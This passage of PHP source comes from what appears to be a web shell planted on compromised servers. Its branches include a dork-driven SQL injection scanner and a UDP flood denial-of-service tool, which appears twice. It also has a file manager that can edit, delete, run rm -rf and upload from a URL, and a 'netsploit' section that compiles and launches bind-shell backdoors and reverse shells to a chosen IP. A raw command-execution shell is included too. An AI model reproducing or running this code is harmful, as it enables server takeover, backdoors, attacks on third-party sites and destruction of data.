elseif(isset($_GET['x']) && ($_GET['x'] == 'sqli-scanner'))
{	
?><?php echo $pwd; ?><?php

echo '<br><br><center><form method="post" action=""><font color="red">Dork :</font> <input type="text" value="" name="dork" style="color:#FF0000;background-color:#000000" size="20"/><input type="submit" style="color:#FF0000;background-color:#000000" name="scan" value="Scan"></form></center>';

ob_start();
set_time_limit(0);

if (isset($_POST['scan'])) {

$browser = $_SERVER['HTTP_USER_AGENT'];

$first = "startgoogle.startpagina.nl/index.php?q=";
$sec = "&start=";
$reg = '/<p class="g"><a href="(.*)" target="_self" onclick="/';

for($id=0 ; $id<=30; $id++){
$page=$id*10;
$dork=urlencode($_POST['dork']);
$url = $first.$dork.$sec.$page;

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl,CURLOPT_USERAGENT,'$browser)');
$result = curl_exec($curl);
curl_close($curl);

preg_match_all($reg,$result,$matches);
}
foreach($matches[1] as $site){

$url = preg_replace("/=/", "='", $site);
$curl=curl_init();
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl,CURLOPT_URL,$url);
curl_setopt($curl,CURLOPT_USERAGENT,'$browser)');
curl_setopt($curl,CURLOPT_TIMEOUT,'5');
$GET=curl_exec($curl); 
if (preg_match("/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch&#8203;_row()|SELECT * 

FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i",$GET)) { 
echo '<center><b><font color="#E10000">Found : </font><a href="'.$url.'" target="_blank">'.$url.'</a><font style="color:#FF0000"> &#60;-- SQLI Vuln 

Found..</font></b></center>';
ob_flush();flush(); 
}else{ 
echo '<center><font style="color:#FFFFFF"><b>'.$url.'</b></font><font style="color:#0FFF16"> &#60;-- Not Vuln</font></center>';
ob_flush();flush(); 
}

ob_flush();flush();
}
ob_flush();flush();
}
ob_flush();flush();
}

elseif(isset($_GET['x']) && ($_GET['x'] == 'zone-h')){	?><?php echo $pwd; ?><?php }

elseif(isset($_GET['x']) && ($_GET['x'] == 'dos'))
	{	
	?><?php echo $pwd; ?><?php
	
	//UDP
	if(isset($_GET['host'])&&isset($_GET['time']))
		{
		$packets = 0;
		ignore_user_abort(TRUE);
		set_time_limit(0);
		
		$exec_time = $_GET['time'];
		
		$time = time();
		//print "Started: ".time('d-m-y h:i:s')."<br>";
		$max_time = $time+$exec_time;
		
		$host = $_GET['host'];
		
		for($i=0;$i<65000;$i++){
			$out .= 'X';
		}
		
		while(1){
			$packets++;
			if(time() > $max_time){ break; }
			$rand = rand(1,65000);
			$fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
			if($fp){
				fwrite($fp, $out);
				fclose($fp);
			}
		}
	
		echo "<br><b>UDP Flood</b><br>Completed with $packets (" . round(($packets*65)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second \n";
		echo '<br><br>
		<form action="'.$surl.'" method=GET>
			<input type="hidden" name="act" value="phptools">
			Host: <br><input type=text name=host><br>
			Length (seconds): <br><input type=text name=time><br>
			<input type=submit value=Go>
		</form>';
		}
	else
		{ 
		echo '<center><form action=? method=GET><input type="hidden" name="act" value="phptools">
			<table class="tabnet" style="width:300px;"> 
				<tr>
					<th colspan="2">UDP Flood</th>
				</tr> 
				<tr>
					<td>&nbsp;&nbsp;Host</td>
					<td><input style="width:220px;" class="inputz" type=text name=host value=></td>
				</tr> 
				<tr>
					<td>&nbsp;&nbsp;Length (seconds)</td>
					<td><input style="width:220px;" class="inputz" type=text name=time value=></td>
				</tr> 
				<tr>
					<td><input style="width:100%;" class="inputzbut" type="submit" value="Attack !" /></td>
				</tr> 
			</table>
		      </center>';
		}
	}

elseif(isset($_GET['x']) && ($_GET['x'] == 'dos'))
	{	
	?><?php echo $pwd; ?><?php
	
	//UDP
	if(isset($_GET['host'])&&isset($_GET['time']))
		{
		$packets = 0;
		ignore_user_abort(TRUE);
		set_time_limit(0);
		
		$exec_time = $_GET['time'];
		
		$time = time();
		//print "Started: ".time('d-m-y h:i:s')."<br>";
		$max_time = $time+$exec_time;
		
		$host = $_GET['host'];
		
		for($i=0;$i<65000;$i++){
			$out .= 'X';
		}
		
		while(1){
			$packets++;
			if(time() > $max_time){ break; }
			$rand = rand(1,65000);
			$fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
			if($fp){
				fwrite($fp, $out);
				fclose($fp);
			}
		}
	
		echo "<br><b>UDP Flood</b><br>Completed with $packets (" . round(($packets*65)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second \n";
		echo '<br><br>
		<form action="'.$surl.'" method=GET>
			<input type="hidden" name="act" value="phptools">
			Host: <br><input type=text name=host><br>
			Length (seconds): <br><input type=text name=time><br>
			<input type=submit value=Go>
		</form>';
		}
	else
		{ 
		echo '<center><form action=? method=GET><input type="hidden" name="act" value="phptools">
			<table class="tabnet" style="width:300px;"> 
				<tr>
					<th colspan="2">UDP Flood</th>
				</tr> 
				<tr>
					<td>&nbsp;&nbsp;Host</td>
					<td><input style="width:220px;" class="inputz" type=text name=host value=></td>
				</tr> 
				<tr>
					<td>&nbsp;&nbsp;Length (seconds)</td>
					<td><input style="width:220px;" class="inputz" type=text name=time value=></td>
				</tr> 
				<tr>
					<td><input style="width:100%;" class="inputzbut" type="submit" value="Go" /></td>
				</tr> 
			</table>
		      </center>';
		}
	}


elseif(isset($_GET['x']) && ($_GET['x'] == 'phpinfo'))
	{ 
	@ob_start(); 
	@eval("phpinfo();"); 
	$buff = @ob_get_contents(); 
	@ob_end_clean(); 
	$awal = strpos($buff,"<body>")+6; 
	$akhir = strpos($buff,"</body>"); 
	echo "<div class=\"phpinfo\">".substr($buff,$awal,$akhir-$awal)."</div>"; 
	} 

elseif(isset($_GET['view']) && ($_GET['view'] != ""))
	{ 
	if(is_file($_GET['view']))
		{ 
		if(!isset($file)) $file = magicboom($_GET['view']); 
		if(!$win && $posix)
			{ 
			$name=@posix_getpwuid(@fileowner($file)); 
			$group=@posix_getgrgid(@filegroup($file)); 
			$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name']; 
			} 
		else { $owner = $user; } 
		$filn = basename($file); 
		echo "<table style=\"margin:6px 0 0 2px;line-height:20px;\"> 
			<tr>
				<td>Filename</td>
				<td>
					<span id=\"".clearspace($filn)."_link\">".$file."</span> 
					<form action=\"?y=".$pwd."&amp;view=$file\" method=\"post\" id=\"".clearspace($filn)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
						<input type=\"hidden\" name=\"oldname\" value=\"".$filn."\" style=\"margin:0;padding:0;\" /> 
						<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$filn."\" /> 
						<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /> 
						<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
							onclick=\"tukar('".clearspace($filn)."_link','".clearspace($filn)."_form');\" /> 
					</form> 
				</td>
			</tr> 
			<tr>
				<td>Size</td>
				<td>".ukuran($file)."</td>
			</tr> 
			<tr>
				<td>Permission</td>
				<td>".get_perms($file)."</td>
			</tr> 
			<tr>
				<td>Owner</td>
				<td>".$owner."</td>
			</tr> 
			<tr>
				<td>Create time</td>
				<td>".date("d-M-Y H:i",@filectime($file))."</td>
			</tr> 
			<tr>
				<td>Last modified</td>
				<td>".date("d-M-Y H:i",@filemtime($file))."</td>
			</tr> 
			<tr>
				<td>Last accessed</td>
				<td>".date("d-M-Y H:i",@fileatime($file))."</td>
			</tr> 
			<tr>
				<td>Actions</td>
				<td><a href=\"?y=$pwd&amp;edit=$file\">edit</a> 
					| <a href=\"javascript:tukar('".clearspace($filn)."_link','".clearspace($filn)."_form');\">rename</a> 
					| <a href=\"?y=$pwd&amp;delete=$file\">delete</a> 
					| <a href=\"?y=$pwd&amp;dl=$file\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$file\">gz</a>)
				</td>
			</tr> 
			<tr>
				<td>View</td>
				<td><a href=\"?y=".$pwd."&amp;view=".$file."\">text</a> 
					| <a href=\"?y=".$pwd."&amp;view=".$file."&amp;type=code\">code</a> 
					| <a href=\"?y=".$pwd."&amp;view=".$file."&amp;type=image\">img</a>
				</td>
			</tr> 
		</table> "; 
		if(isset($_GET['type']) && ($_GET['type']=='image'))
			{ echo "<div style=\"text-align:center;margin:8px;\"><img src=\"?y=".$pwd."&amp;img=".$filn."\"></div>"; } 
		elseif(isset($_GET['type']) && ($_GET['type']=='code'))
			{ echo "<div class=\"viewfile\">"; $file = wordwrap(@file_get_contents($file),"240","\n"); @highlight_string($file); echo "</div>"; } 
		else 	{ echo "<div class=\"viewfile\">"; echo nl2br(htmlentities((@file_get_contents($file)))); echo "</div>"; } 
		} 
	elseif(is_dir($_GET['view'])){ echo showdir($pwd,$prompt); } 
	} 

elseif(isset($_GET['edit']) && ($_GET['edit'] != ""))
	{ 
	if(isset($_POST['save']))
		{ 
		$file = $_POST['saveas']; 
		$content = magicboom($_POST['content']); 
		if($filez = @fopen($file,"w"))
			{ 
			$time = date("d-M-Y H:i",time()); 
			if(@fwrite($filez,$content)) $msg = "file saved <span class=\"gaya\">@</span> ".$time; 
			else $msg = "failed to save"; @fclose($filez); 
			} 
		else $msg = "permission denied"; 
		} 
	if(!isset($file)) $file = $_GET['edit']; 
	if($filez = @fopen($file,"r"))
		{ 
		$content = ""; 
		while(!feof($filez))
			{ 
			$content .= htmlentities(str_replace("''","'",fgets($filez))); 
			} 
		@fclose($filez); 
		} ?><?php echo $pwd; ?><?php echo $file; ?><?php echo $content; ?><?php echo $file; ?><?php echo $msg; ?><?php 
	} 

elseif(isset($_GET['x']) && ($_GET['x'] == 'upload'))
	{ 
	if(isset($_POST['uploadcomp']))
		{ 
		if(is_uploaded_file($_FILES['file']['tmp_name']))
			{ 
			$path = magicboom($_POST['path']); 
			$fname = $_FILES['file']['name']; 
			$tmp_name = $_FILES['file']['tmp_name']; 
			$pindah = $path.$fname; 
			$stat = @move_uploaded_file($tmp_name,$pindah); 
			if ($stat) { $msg = "file uploaded to $pindah"; } 
			else $msg = "failed to upload $fname"; 
			} 
		else $msg = "failed to upload $fname"; 
		} 
	elseif(isset($_POST['uploadurl']))
		{ 
		$pilihan = trim($_POST['pilihan']); 
		$wurl = trim($_POST['wurl']); 
		$path = magicboom($_POST['path']); 
		$namafile = download($pilihan,$wurl); 
		$pindah = $path.$namafile; 
		if(is_file($pindah)) { $msg = "file uploaded to DIR $pindah"; } 
		else $msg = "failed ! to upload $namafile"; } 
	?><?php echo $pwd; ?><?php echo $pwd; ?><?php echo $pwd; ?><?php echo $pwd; ?><?php echo $msg; ?><?php } 

elseif(isset($_GET['x']) && ($_GET['x'] == 'netsploit'))
	{ 
	if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) 
		{ 	
		$port = trim($_POST['port']); 
		$passwrd = trim($_POST['bind_pass']); 
		tulis("bdc.c",$port_bind_bd_c); 
		exe("gcc -o bdc bdc.c"); 
		exe("chmod 777 bdc"); 
		@unlink("bdc.c"); 
		exe("./bdc ".$port." ".$passwrd." &"); 
		$scan = exe("ps aux"); 
		if(eregi("./bdc $por",$scan))
			{ 
			$msg = "<p>Process found running, backdoor setup successfully.</p>"; 
			} 
		else 
			{ 
			$msg = "<p>Process not found running, backdoor not setup successfully.</p>"; 
			} 
		} 
	elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) 
		{ 
		$port = trim($_POST['port']); 
		$passwrd = trim($_POST['bind_pass']); 
		tulis("bdp",$port_bind_bd_pl); 
		exe("chmod 777 bdp"); 
		$p2=which("perl"); 
		exe($p2." bdp ".$port." &"); 
		$scan = exe("ps aux"); 
		if(eregi("$p2 bdp $port",$scan))
			{ $msg = "<p>Process found running, backdoor setup successfully.</p>"; } 
		else { $msg = "<p>Process not found running, backdoor not setup successfully.</p>"; } } 
	elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'C')) 
		{ 
		$ip = trim($_POST['ip']); 
		$port = trim($_POST['backport']); 
		tulis("bcc.c",$back_connect_c); 
		exe("gcc -o bcc bcc.c"); 
		exe("chmod 777 bcc"); 
		@unlink("bcc.c"); 
		exe("./bcc ".$ip." ".$port." &"); 
		$msg = "Now script try connect to ".$ip." port ".$port." ..."; 
		} 
	elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) 
		{ 
		$ip = trim($_POST['ip']); 
		$port = trim($_POST['backport']); 
		tulis_2("bcp",$back_connect); 
		exe("chmod +x bcp"); 
		$p2=which("perl"); 
		exe($p2." bcp ".$ip." ".$port." &"); 
		sleep(1);
		$msg = "Now script try connect to ".$ip." port ".$port." ..."; 
		unlink("bcp");
		} 
	elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['wcmd'])) 
		{ 
		$pilihan = trim($_POST['pilihan']); 
		$wurl = trim($_POST['wurl']); 
		$namafile = download($pilihan,$wurl); 
		if(is_file($namafile)) { $msg = exe($wcmd); } else $msg = "error: file not found $namafile"; } 
	?><?php echo $pwd; ?><?php echo $bindport ?><?php echo $bindport_pass; ?><?php echo $pwd; ?><?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?><?php echo $bindport; ?><?php echo $pwd; ?><?php echo $msg; ?><?php } 

elseif(isset($_GET['x']) && ($_GET['x'] == 'shell'))
	{ 
	?><?php echo $pwd; ?><?php if(isset($_POST['submitcmd'])) { echo @exe($_POST['cmd']); } ?><?php echo $prompt; ?><?php 
	} 
else 
	{ 
	if(isset($_GET['delete']) && ($_GET['delete'] != ""))
		{ 
		$file = $_GET['delete']; @unlink($file); 
		} 
	elseif(isset($_GET['fdelete']) && ($_GET['fdelete'] != ""))
		{ 
		@exe('rm -rf '.$_GET['fdelete'].''); 
		} 
	elseif(isset($_GET['mkdir']) && ($_GET['mkdir'] != ""))
		{ 
		$path = $pwd.$_GET['mkdir']; @mkdir($path); 
		} 
	$buff = showdir($pwd,$prompt); 
	echo $buff; 
	} 
	?>